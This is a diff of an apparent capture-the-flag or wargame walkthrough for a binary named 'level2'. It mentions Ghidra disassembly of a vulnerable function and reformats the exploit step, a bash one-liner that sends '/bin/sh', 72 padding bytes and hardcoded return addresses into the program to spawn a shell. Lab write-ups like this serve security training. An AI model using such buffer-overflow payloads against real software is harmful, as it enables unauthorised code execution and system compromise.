@@ -34,6 +34,7 @@
 	```
 
 5. **Disassemble and inspect with Ghidra**
+
 	The vulnerable function:
 
 	```c
@@ -113,8 +114,7 @@
 8. **Execute the exploit**
 
 	```bash
-	(printf "/bin/sh\x00"; printf 'A%.0s' {1..72}; \
-	printf '\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x08\xa0\x04\x08'; cat) | ./level2
+	(printf "/bin/sh\x00"; printf 'A%.0s' {1..72}; printf '\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x08\xa0\x04\x08\n'; cat) | ./level2
 	```
 
 9. **Read the password**
